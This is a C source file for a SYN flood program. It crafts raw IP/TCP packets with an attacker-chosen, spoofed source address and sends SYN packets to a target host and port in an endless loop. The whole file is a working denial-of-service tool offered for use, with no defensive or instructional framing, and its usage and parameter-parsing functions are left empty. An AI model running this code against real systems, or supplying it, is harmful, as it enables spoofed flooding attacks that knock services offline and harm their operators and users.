/*
 *  a synflood program used to send syn packet
 *
 *  write by Forrest.zhang
 */
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>

void hose_trusted(unsigned int, unsigned int, unsigned short, int);
unsigned short in_cksum(unsigned short *, int);
unsigned int host2ip(char *);

#define padding_sz 1000
#define cmdopts             "-t"

/*
 *  usage
 */
static void usage(void)
{
    
}

/* 
 *  parse command line parameter
 */ 
static int parse_parameter(int argc, char **argv)
{
    
}

int main(int argc, char **argv)
{
   unsigned int srchost;
   unsigned int dsthost;
   unsigned short port=80;
   unsigned int number=1000;
   if(argc < 3) {
      printf("%s srchost dsthost port num\n", argv[0]);
      exit(0);
   }
   srchost = host2ip(argv[1]);
   dsthost = host2ip(argv[2]);
   if(argc >= 4) port = atoi(argv[3]);
   if(argc >= 5) number = atoi(argv[4]);
   if(port == 0) port = 80;
   if(number == 0) number = 1000;
   printf("synflooding %s from %s port %u %u times\n", argv[2], argv[1], port, number);
   hose_trusted(srchost, dsthost, port, number);
}

void hose_trusted(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, int numsyns)
{
   struct send_tcp
   {
      struct iphdr ip;
      struct tcphdr tcp;
      char padding[padding_sz];
   } send_tcp;
   struct pseudo_header
   {
      unsigned int source_address;
      unsigned int dest_address;
      unsigned char placeholder;
      unsigned char protocol;
      unsigned short tcp_length;
      struct tcphdr tcp;
   } pseudo_header;
   int i;
   int tcp_socket;
   struct sockaddr_in sin;
   int sinlen;
            
   /* form ip packet */
   send_tcp.ip.ihl = 5;
   send_tcp.ip.version = 4;
   send_tcp.ip.tos = 0;
   send_tcp.ip.tot_len = htons(40);
   send_tcp.ip.id = getpid();
   send_tcp.ip.frag_off = 0;
   send_tcp.ip.ttl = 255;
   send_tcp.ip.protocol = IPPROTO_TCP;
   send_tcp.ip.check = 0;
   send_tcp.ip.saddr = source_addr;
   send_tcp.ip.daddr = dest_addr;
   
   /* form tcp packet */
   send_tcp.tcp.source = htons(1000); //getpid();
   send_tcp.tcp.dest = htons(dest_port);
   send_tcp.tcp.seq = getpid();   
   send_tcp.tcp.ack_seq = 0;
   send_tcp.tcp.res1 = 0;
   send_tcp.tcp.doff = 5;
   send_tcp.tcp.fin = 0;
   send_tcp.tcp.syn = 1;
   send_tcp.tcp.rst = 0;
   send_tcp.tcp.psh = 0;
   send_tcp.tcp.ack = 0;
   send_tcp.tcp.urg = 0;
//   send_tcp.tcp.res2 = 0;
   send_tcp.tcp.window = htons(1400);
   send_tcp.tcp.check = 0;
   send_tcp.tcp.urg_ptr = 0;

   memset(send_tcp.padding, 0, padding_sz);
   
   /* setup the sin struct */
   sin.sin_family = AF_INET;
   sin.sin_port = send_tcp.tcp.source;
   sin.sin_addr.s_addr = send_tcp.ip.daddr;   
   
   /* (try to) open the socket */
   tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if(tcp_socket < 0)
   {
      perror("socket");
      exit(1);
   }
   

   printf("start:%lu\n", time(NULL));

   while (1)
//   for(i=0;i < numsyns;i++)
   {
      /* set fields that need to be changed */
      send_tcp.tcp.source = htons(ntohs(send_tcp.tcp.source)+1);
      send_tcp.ip.id++;
      send_tcp.tcp.seq++;
      send_tcp.tcp.check = 0;
      send_tcp.ip.check = 0;
      
      /* calculate the ip checksum */
      send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);

      /* set the pseudo header fields */
      pseudo_header.source_address = send_tcp.ip.saddr;
      pseudo_header.dest_address = send_tcp.ip.daddr;
      pseudo_header.placeholder = 0;
      pseudo_header.protocol = IPPROTO_TCP;
      pseudo_header.tcp_length = htons(20+1024);
      bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
      send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
      sinlen = sizeof(sin);
      sendto(tcp_socket, &send_tcp, 40+padding_sz, 0, (struct sockaddr *)&sin, sinlen);
   //   usleep(1);
   }
   printf("stop:%lu\n", time(NULL));
   close(tcp_socket);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
        register long           sum;            /* assumes long == 32 bits */
        u_short                 oddbyte;
        register u_short        answer;         /* assumes u_short == 16 bits */

        /*
         * Our algorithm is simple, using a 32-bit accumulator (sum),
         * we add sequential 16-bit words to it, and at the end, fold back
         * all the carry bits from the top 16 bits into the lower 16 bits.
         */

        sum = 0;
        while (nbytes > 1)  {
                sum += *ptr++;
                nbytes -= 2;
        }

                                /* mop up an odd byte, if necessary */
        if (nbytes == 1) {
                oddbyte = 0;            /* make sure top half is zero */
                *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
                sum += oddbyte;
        }

        /*
         * Add back carry outs from top 16 bits to low 16 bits.
         */

        sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;          /* ones-complement, then truncate to 16 bits */
        return(answer);
}

unsigned int host2ip(char *hostname)
{
   static struct in_addr i;
   struct hostent *h;
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         fprintf(stderr, "cant find %s!\n", hostname);
         exit(0);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
}
